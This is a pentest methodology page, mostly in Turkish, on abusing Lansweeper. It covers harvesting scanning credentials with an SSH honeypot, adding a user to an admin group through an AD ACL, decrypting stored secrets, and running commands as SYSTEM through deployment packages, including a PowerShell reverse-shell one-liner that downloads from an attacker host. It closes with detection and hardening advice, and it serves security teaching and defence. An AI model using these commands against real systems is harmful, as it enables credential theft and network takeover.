# Lansweeper Abuse: Credential Harvesting, Secrets Decryption ve Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper, genellikle Windows üzerinde dağıtılan ve Active Directory ile entegre edilen bir IT asset discovery ve inventory platformudur. Lansweeper'da yapılandırılan credentials, scanning engine'leri tarafından SSH, SMB/WMI ve WinRM gibi protokoller üzerinden asset'lere authenticate olmak için kullanılır. Yanlış yapılandırmalar sıklıkla şunlara olanak tanır:

- Bir scanning target'ı attacker-controlled bir host'a (honeypot) yönlendirerek credential interception
- Lansweeper ile ilişkili gruplar tarafından açığa çıkarılan AD ACL'lerini abuse ederek remote access elde etme
- Lansweeper'da yapılandırılmış secret'ların (connection string'ler ve stored scanning credentials) on-host decryption işlemi
- Deployment özelliği üzerinden managed endpoint'lerde code execution (çoğunlukla SYSTEM olarak çalışır)

Bu sayfa, engagement'lar sırasında bu davranışları abuse etmek için kullanılan pratik attacker workflow'larını ve command'lerini özetler.

## 1) Honeypot ile scanning credentials harvest etme (SSH örneği)

Fikir: host'unuzu işaret eden bir Scanning Target oluşturun ve mevcut Scanning Credentials'ları bu target'a map edin. Scan çalıştığında Lansweeper bu credentials ile authenticate olmaya çalışır ve honeypot'unuz bunları capture eder.<sup>[[1]](#references)</sup>

Adımların özeti (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (veya Single IP) = VPN IP'niz
- SSH port'unu erişilebilir bir değere yapılandırın (ör. 22 engelliyse 2022)
- Schedule'ı devre dışı bırakın ve manuel olarak trigger etmeyi planlayın
- Scanning → Scanning Credentials → Linux/SSH creds'lerin mevcut olduğundan emin olun; bunları yeni target'a map edin (gerektiğinde tümünü enable edin)
- Target üzerinde “Scan now” seçeneğine tıklayın
- Bir SSH honeypot çalıştırın ve denenen username/password bilgisini alın

sshesame ile örnek:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Yakalanan kimlik bilgilerini DC hizmetlerine karşı doğrula:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notlar
- Diğer protokoller eşdeğer değildir: bir SMB/WinRM listener'ı normalde cleartext password yerine bir NTLM challenge-response elde eder. Bunu crack etmek veya relay etmek, üzerinde anlaşılan protokol korumalarına bağlıdır; bkz. [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). SSH password authentication genellikle en basit cleartext durumudur.
- SSH public-key authentication, username ve public-key fingerprint bilgisini sunucuya açığa çıkarır; **private key'i veya passphrase'ini değil**. Key-backed credentials bilgisini bir honeypot'un açığa çıkarmasını beklemek yerine, ele geçirilmiş Lansweeper sunucusundan kurtarın.<sup>[[2]](#references)</sup>
- Birçok scanner kendisini farklı client banner'larıyla (ör. RebexSSH) tanıtır ve benign komutları (uname, whoami vb.) çalıştırmayı dener.

### Credential selection order önemlidir

Bir rescan için Lansweeper önce ilgili asset için en son başarılı olan credential'ı, ardından yapılandırılmış sıralarındaki açıkça eşlenmiş credential'ları ve son olarak aynı türdeki global credential'ı yeniden dener. İlk password authentication denemesini kabul eden bir honeypot bu nedenle normalde sonraki fallback credential'larını gözlemleyemez; yetkili bir credential-path assessment sırasında amaç tüm fallback sequence'i doğrulamaksa denemeleri loglayın ve reddedin.<sup>[[6]](#references)</sup>

## 2) AD ACL abuse: kendinizi bir app-admin grubuna ekleyerek remote access elde etme

Ele geçirilmiş account'tan effective rights bilgisini enumerate etmek için BloodHound kullanın. Yaygın bir bulgu, scanner'a veya app'e özgü bir grubun (ör. “Lansweeper Discovery”) privileged bir grup (ör. “Lansweeper Admins”) üzerinde GenericAll hakkına sahip olmasıdır. Privileged grup aynı zamanda “Remote Management Users” grubunun üyesiyse, kendimizi eklediğimizde WinRM kullanılabilir hale gelir.<sup>[[1]](#references)[[5]](#references)</sup>

Collection örnekleri:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
BloodyAD ile grup üzerinde GenericAll Exploit'i (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Ardından etkileşimli bir shell elde edin:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
İpucu: Kerberos işlemleri zamana duyarlıdır. KRB_AP_ERR_SKEW hatasıyla karşılaşırsanız önce DC ile senkronize olun:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Host üzerindeki Lansweeper-configured secret'ların şifresini çözme

Lansweeper sunucusunda ASP.NET site'ı genellikle uygulama tarafından kullanılan şifrelenmiş bir connection string ve simetrik anahtar depolar. Uygun yerel erişimle DB connection string'in şifresini çözebilir ve ardından depolanmış scanning kimlik bilgilerini çıkarabilirsiniz.<sup>[[1]](#references)</sup>

Tipik konumlar:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Depolanmış creds'lerin şifresini çözme ve dökümünü alma işlemini otomatikleştirmek için SharpLansweeperDecrypt kullanın. Argüman olmadan mevcut executable `web.config` dosyasının şifresini çözer, database'e bağlanır ve yapılandırılmış tüm scanning kimlik bilgilerini döker; `-e`, şifrelenmiş bir değer ve key file zaten mevcut olduğunda offline/manual decryption işlemini de destekler:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
Beklenen çıktı, DB bağlantı ayrıntılarını ve ortam genelinde kullanılan Windows ve Linux hesapları gibi düz metin tarama kimlik bilgilerini içerir. Bunlar genellikle domain host'larında yükseltilmiş yerel yetkilere sahiptir:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Ayrıcalıklı erişim için kurtarılmış Windows tarama kimlik bilgilerini kullanın:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“Lansweeper Admins” üyesi olarak web arayüzü, Deployment ve Configuration bölümlerini kullanıma açar. Deployment → Deployment packages altında, hedeflenen asset'lerde arbitrary commands çalıştıran paketler oluşturabilirsiniz. Lansweeper, hedefin Task Scheduler ve `C$` öğelerine erişmek için yönetici tarama kimlik bilgilerini kullanır ve ardından deployment için bir task oluşturur. Paket **System Account** run mode'unu kullandığında payload `NT AUTHORITY\SYSTEM` olarak çalışır; diğer run mode'ları eşlenen tarama kimliğini veya o anda oturum açmış kullanıcıyı kullanabilir. Bu nedenle SYSTEM varsayımı yapmak yerine seçili modu doğrulayın.<sup>[[1]](#references)[[7]](#references)</sup>

High-level steps:
- PowerShell veya cmd one-liner (reverse shell, add-user vb.) çalıştıran yeni bir Deployment package oluşturun.
- İstenen asset'i (ör. Lansweeper'ın çalıştığı DC/host) hedefleyin ve Deploy/Run now'a tıklayın.
- Shell'inizi SYSTEM olarak yakalayın.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. Dikkatli kullanın.

### Deployment artifacts and a second credential exposure point

Tarayıcı, deployment executable dosyasını `C:\Windows\LSDeployment` altında `C$` üzerinden yazar. Package dosyaları normalde `C:\Program Files (x86)\Lansweeper\PackageShare` tarafından desteklenen `DefaultPackageShare$` üzerinden veya IP aralığına özgü bir package share üzerinden okunur. Önemli olarak Lansweeper, package-share credential bilgisinin **deployment alan her bilgisayarın registry'sinde geri döndürülebilir şekilde şifrelenmiş biçimde saklandığını** belirtir. Ele geçirilmiş bir managed endpoint'i bu share hesabı için olası bir disclosure noktası olarak değerlendirin ve Lansweeper etkinliklerini yeniden oluştururken deployment dizinini, scheduled-task geçmişini ve yapılandırılmış package share'leri inceleyin.<sup>[[7]](#references)</sup>

## Detection and hardening

- Anonymous SMB enumerations işlemlerini kısıtlayın veya kaldırın. RID cycling ve Lansweeper share'lerine yönelik anormal erişimleri izleyin.
- Egress kontrolleri: scanner host'larından dışarıya giden SSH/SMB/WinRM trafiğini engelleyin veya sıkı şekilde kısıtlayın. Standart olmayan portlar (ör. 2022) ve Rebex gibi alışılmadık client banner'ları için alert oluşturun.
- `Website\\web.config` ve `Key\\Encryption.txt` dosyalarını koruyun. Secret'ları bir vault'a taşıyın ve exposure durumunda rotate edin. Mümkün olduğunda minimum yetkili service account'ları ve gMSA kullanmayı değerlendirin.
- AD monitoring: Lansweeper ile ilgili gruplardaki (ör. “Lansweeper Admins”, “Remote Management Users”) değişiklikler ve privileged group'lara GenericAll/Write membership yetkisi veren ACL değişiklikleri için alert oluşturun.
- Deployment package oluşturma/değiştirme/çalıştırma işlemlerini audit edin ve yeni remote scheduled task'leri `C:\Windows\LSDeployment` konumuna yapılan yazma işlemleriyle ilişkilendirin; `cmd.exe`/`powershell.exe` başlatan veya beklenmeyen outbound connection'lar oluşturan package'ler için alert oluşturun.
- Package-share credential'larına yalnızca **Read & Execute** yetkisi verin ve bunları administration için asla yeniden kullanmayın. Pratik olduğunda agent-based inventory'yi tercih edin: tüm bilgisayarlar bir agent tarafından taranıyorsa ve deployment module kullanılmıyorsa Lansweeper'ın stored computer scanning credential'larına ihtiyacı yoktur.<sup>[[6]](#references)[[7]](#references)</sup>

## Related topics
- [SMB/LSA/SAMR enumeration and RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Kerberos authentication and clock-skew considerations](kerberos-authentication.md)
- [BloodHound path analysis](bloodhound.md)
- [WinRM usage and lateral movement](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Lansweeper Scanning, AD ACLs ve Secrets'ı Kötüye Kullanarak DC'yi Ele Geçirme (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot'u)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Scanning credential'ları oluşturma ve eşleme — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Deployment gereksinimleri — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
